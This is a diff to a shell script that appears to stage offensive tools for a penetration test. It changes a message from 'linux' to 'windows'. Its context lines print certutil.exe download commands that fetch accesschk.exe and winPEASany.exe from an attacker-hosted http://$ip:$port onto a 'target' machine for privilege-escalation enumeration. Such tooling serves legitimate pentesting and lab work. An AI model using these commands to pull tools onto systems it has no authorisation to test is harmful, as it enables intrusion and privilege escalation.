@@ -64,7 +64,7 @@ if [ ! -f "Watson.exe" ]; then
 fi
 
 echo ""
-echo "You can download any of these tools to your target linux machine using commands below:"
+echo "You can download any of these tools to your target windows machine using commands below:"
 echo ""
 echo "certutil.exe -urlcache -split -f http://$ip:$port/accesschk.exe accesschk.exe"
 echo "certutil.exe -urlcache -split -f http://$ip:$port/winPEASany.exe winPEASany.exe"
